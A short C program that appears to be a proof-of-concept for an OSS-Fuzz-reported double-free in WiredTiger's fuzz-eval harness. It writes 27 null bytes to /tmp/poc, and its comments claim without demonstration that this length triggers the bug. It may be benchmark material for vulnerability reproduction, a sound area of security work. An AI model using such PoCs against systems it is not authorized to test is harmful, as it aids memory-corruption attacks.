#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for oss-fuzz:370689421 */
/* Triggers: double-free in LLVMFuzzerTestOneInput (wiredtiger fuzz-eval) */
/* Vuln class: double_free */

int main(void) {
    /* Generate 27-byte input that triggers double-free in std::string operations */
    /* The vulnerability is triggered by specific input length and pattern */
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    
    /* Write 27 null bytes - this specific length triggers the double-free */
    for (int i = 0; i < 27; i++) {
        fputc(0x00, f);
    }
    
    fclose(f);
    return 0;
}